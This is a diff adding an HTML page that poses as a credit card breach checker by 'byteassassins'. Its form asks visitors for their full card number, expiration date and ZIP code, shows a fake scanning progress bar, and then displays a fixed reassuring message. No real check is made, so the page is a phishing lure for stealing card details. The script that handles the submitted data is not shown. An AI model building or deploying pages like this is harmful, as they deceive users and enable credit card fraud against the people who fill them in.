@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Credit Card Security</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <h1>Credit Card Security by byteassassins🌚™</h1>
+        <p>Is your credit card number in a hacker's database?</p>
+        <p>You can easily find out now! All you need to do is enter its information here and we will scan thousands of hacker databases to see if any they have match yours.</p>
+        
+        <form id="credit-card-form">
+            <label for="cc-number">Credit Card Number:</label>
+            <input type="text" id="cc-number" required>
+            
+            <label for="exp-date">Expiration Date:</label>
+            <input type="text" id="exp-date" required>
+            
+            <label for="zip-code">Your Zip Code:</label>
+            <input type="text" id="zip-code" required>
+            
+            <button type="submit">SCAN DATABASE</button>
+        </form>
+
+        <div id="scan-result" class="hidden">
+            <p>Scanning databases...</p>
+            <div class="progress-bar">
+                <div class="progress"></div>
+            </div>
+            <p id="scan-status"></p>
+        </div>
+
+        <div id="result-message" class="hidden">
+            <p>Your card number did not show up in any of the hacker's databases!</p>
+            <button id="ok-btn">OK</button>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
